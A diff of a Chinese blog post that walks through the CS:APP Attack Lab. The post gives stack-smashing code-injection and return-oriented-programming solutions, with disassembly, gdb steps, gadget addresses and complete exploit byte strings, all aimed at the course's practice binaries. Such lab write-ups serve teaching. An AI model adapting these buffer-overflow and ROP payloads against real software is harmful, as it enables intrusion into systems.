@@ -480,12 +480,10 @@
     <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>getbuf</code> 函数在栈中申请了一块 <code>BUFFER_SIZE</code> 大小的空间, 并利用这块空间首地址作为 <code>Gets</code> 函数的参数从标准输入中读取字符. 我们可以通过提供一个超过 <code>BUFFER_SIZE</code> 的字符串来向 <code>getbuf</code> 的栈帧之外写入数据.</p>
 <h2 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>需要重写函数的正常返回地址, 将函数重定向到 <code>touch1</code> 函数.</p>
 <p>首先查看 <code>ctarget</code> 的反汇编代码.</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> ctarget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>在 <code>getbuf</code> 中, <code>%rsp</code> 被减了 <code>0x38</code>, <code>BUFFER_SIZE</code> 大小是 <code>56</code>.</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cdb &lt;getbuf&gt;:
   401cdb:	f3 0f 1e fa          	endbr64 
@@ -495,7 +493,6 @@
   401ceb:	b8 01 00 00 00       	mov    $0x1,%eax
   401cf0:	48 83 c4 38          	add    $0x38,%rsp
   401cf4:	c3                   	retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>touch1</code> 函数地址是 <code>0x401cf5</code>.</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cf5 &lt;touch1&gt;:
   401cf5:	f3 0f 1e fa          	endbr64 
@@ -510,7 +507,6 @@
   401d1a:	e8 f4 04 00 00       	callq  402213 &lt;validate&gt;
   401d1f:	bf 00 00 00 00       	mov    $0x0,%edi
   401d24:	e8 b7 f4 ff ff       	callq  4011e0 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>解题思路:</p>
 <ul>
 <li>将 <code>getbuf</code> 函数栈上分配的空间填满, 并且在下 <code>8</code> 个字节, 即正常返回地址上填充 <code>touch1</code> 的地址.</li>
@@ -527,7 +523,6 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 传递进 <code>%rdi</code> 作为参数, 然后程序流跳转到 <code>touch2</code> 函数.</p>
 <p>我的 <code>cookie</code> 值为 <code>0x36bf93ac</code>, <code>touch2</code> 函数会验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -541,14 +536,12 @@ f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true
     <span class="token punctuation">}</span>
     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>touch2</code> 函数地址是 <code>0x401d29</code>.</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401d29 &lt;touch2&gt;:
   401d29:	f3 0f 1e fa          	endbr64 
   401d2d:	50                   	push   %rax
   401d2e:	58                   	pop    %rax
   ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>解题思路:</p>
 <ul>
 <li>将返回地址设置为注入代码的地址, 选择在栈顶注入, 返回地址则设置为 <code>%rsp</code>.</li>
@@ -560,12 +553,10 @@ f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true
 movq   $0x36bf93ac, %rdi
 pushq  $0x401d29
 retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>然后执行</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">2</span>.s
 linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">2</span>.o <span class="token operator">&gt;</span> <span class="token number">2</span>.d
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>得到机器代码:</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.d
 2.o:     file format elf64-x86-64
@@ -578,7 +569,6 @@ Disassembly of section .text:
    7:	68 29 1d 40 00       	pushq  $0x401d29
    c:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>我们只需将指令序列 <code>48 c7 c7 ac 93 bf 36 68 29 1d 40 00 c3</code> 注入栈顶. 下面寻找 <code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code>, 使用 <code>gdb</code> 调试.</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gdb ctarget
 <span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token builtin class-name">break</span> getbuf
@@ -598,7 +588,6 @@ Disassembly of section .text:
 <span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p /x <span class="token variable">$rsp</span>
 <span class="token variable">$1</span> <span class="token operator">=</span> 0x55633168
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>从而 <code>%rsp</code> 为 <code>0x55633168</code>.</p>
 <p><img src="/pic/37.png" alt="栈帧结构"></p>
 <p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址.</p>
@@ -612,7 +601,6 @@ Disassembly of section .text:
 00 00 00 00 00 00 00 00  
 68 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 变为字符串并传入 <code>%rdi</code>, 然后程序流跳转到 <code>touch3</code> 函数.</p>
 <p><code>hexmatch</code>函数检查 <code>cookie</code> 和传进来的字符是否匹配.</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -622,7 +610,6 @@ Disassembly of section .text:
     <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>touch3</code> 函数会调用 <code>hexmatch</code> 函数验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>
     vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
@@ -636,7 +623,6 @@ Disassembly of section .text:
     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>如果将 <code>cookie</code> 串存放在 <code>getbuf</code> 栈帧中, 注意到 <code>hexmatch</code> 中 <code>char *s = cbuf + random() % 100</code> 可能会覆盖原 <code>getbuf</code> 栈帧, 造成数据丢失, 因此需将 <code>cookie</code> 串存放在 <code>test</code> 栈帧中.</p>
 <p>解题思路:</p>
 <ul>
@@ -650,12 +636,10 @@ mov    $0x556331a8, %rdi
 pushq  $0x401e4e
 retq
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>然后执行</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">3</span>.s
 linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">3</span>.o <span class="token operator">&gt;</span> <span class="token number">3</span>.d
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>得到机器代码:</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.d
 3.o:     file format elf64-x86-64
@@ -668,7 +652,6 @@ Disassembly of section .text:
    7:	68 4e 1e 40 00       	pushq  $0x401e4e
    c:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>我们只需将指令序列 <code>48 c7 c7 a8 31 63 55 68 4e 1e 40 00 c3</code> 注入栈顶.</p>
 <p><img src="/pic/38.png" alt="栈帧结构"></p>
 <p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址, 并保存 <code>cookie</code> 字符串.</p>
@@ -684,20 +667,17 @@ Disassembly of section .text:
 33 36 62 66 39 33 61 63
 00                 	     &lt;----- cookie 字符串
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h2 id="Return-Oriented-Programming-Attacks"><a href="#Return-Oriented-Programming-Attacks" class="headerlink" title="Return-Oriented Programming Attacks"></a>Return-Oriented Programming Attacks</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第二阶段的任务, 把 <code>cookie</code> 值传送到 <code>%rdi</code>, 然后调用 <code>touch2</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p>
 <p>需要的代码为:</p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %rax       # 将 cookie 存入 %rax
 movq %rax, %rdi # 将 cookie 存入 %rdi
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p><code>popq %rax</code> 的指令字节为 <code>58</code>，找到了如下函数:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f1d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_439</span><span class="token punctuation">&gt;</span></span>:
   401f1d:	f3 0f 1e fa          	endbr64 
   401f21:	c7 07 58 c3 4c cf    	movl   $0xcf4cc358,(%rdi)
   401f27:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>得出 <code>popq %rax</code> 指令的地址为 <code>0x401f23</code>.</p>
 <p><code>movq %rax, %rdi</code> 的指令字节为 <code>48 89 c7</code>, 找到了如下函数:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f12 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_318</span><span class="token punctuation">&gt;</span></span>:
@@ -705,7 +685,6 @@ movq %rax, %rdi # 将 cookie 存入 %rdi
   401f16:	c7 07 6f 48 89 c7    	movl   $0xc789486f,(%rdi)
   401f1c:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>得出 <code>movq %rax, %rdi</code> 指令的地址为 <code>0x401f19</code>.</p>
 <p><img src="/pic/39.png" alt="栈帧结构"></p>
 <p>下面构建输入字符串: 首先填充 <code>popq %rax</code> 指令, 注入 <code>cookie</code> 的值, 接着填入 <code>movq %rax, %rdi</code> 指令与 <code>touch2</code> 函数的起始地址.</p>
@@ -721,7 +700,6 @@ ac 93 bf 36 00 00 00 00  &lt;----- coookie
 19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi
 29 1d 40 00 00 00 00 00  &lt;----- touch2 的起始地址
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第三阶段的任务, 把 <code>cookie</code> 字符串的起始地址传送到 <code>%rdi</code>, 然后调用 <code>touch3</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p>
 <p>因为程序使用栈随机化增强安全性能, 只能用栈顶地址 + 偏移量来索引 <code>cookie</code> 字符串的起始地址.</p>
 <p>注意到 <code>farm</code> 中已经存在了一个 <code>add_xy</code> 函数, 可以考虑将 <code>%rsp</code> 传入 <code>%rdi</code>, 将偏移量传入 <code>%rsi</code>, 进而计算出 <code>cookie</code> 字符串的首地址, 并传送到 <code>%rax</code>.</p>
@@ -730,14 +708,12 @@ ac 93 bf 36 00 00 00 00  &lt;----- coookie
   401f5f:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   401f63:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <ul>
 <li>将 <code>%rsp</code> 传入 <code>%rdi</code> 需要的代码为:</li>
 </ul>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movq %rsp, %rax
 movq %rax, %rdi
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <ul>
 <li>将偏移量传入 <code>%rsi</code> 需要的代码为:</li>
 </ul>
@@ -746,7 +722,6 @@ movq %eax, %ecx
 movq %ecx, %edx
 movq %edx, %esi
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>最困难的一条指令、也是唯一没有使用 <code>c3</code> 或 <code>90</code> 结尾的 <code>gadget</code> 指令为: 从 <code>%ecx</code> 传入 <code>%esi</code>. </p>
 <p>这一步的指令字节为 <code>89 ca</code>, 而 <code>08 db</code> 为一个<code>nop</code> 指令 <code>orb %bl %bl</code> 的编码, 因此 <code>0x401fe9</code>是一个符合要求的 <code>gadget</code> 地址. </p>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401fe3 &lt;setval_370&gt;:
@@ -754,14 +729,12 @@ movq %edx, %esi
   401fe7:	c7 07 89 ca 08 db    	movl   $0xdb08ca89,(%rdi)
   401fed:	c3                   	retq   
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
 <ul>
 <li>计算 <code>cookie</code> 地址, 传入 <code>%rdi</code> 需要的代码为:</li>
 </ul>
 <pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea  (%rdi,%rsi,1),%rax
 movq %rax, %rdi
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p>获取 <code>%rsp</code> 的指令与 <code>cookie</code> 字符串的存储地址间隔了九条 <code>8</code> 字节指令, 因此偏移量为 <code>0x48</code>.</p>
 <p><img src="/pic/40.png" alt="栈帧结构"></p>
 <p>下面构建输入字符串:</p>
@@ -785,7 +758,6 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
 33 36 62 66 39 33 61 63
 00                       &lt;----- cookie 字符串
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
                 
             </div>
@@ -1177,7 +1149,7 @@ a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">85k</span>
+                        class="white-color">73k</span>
             
             
             
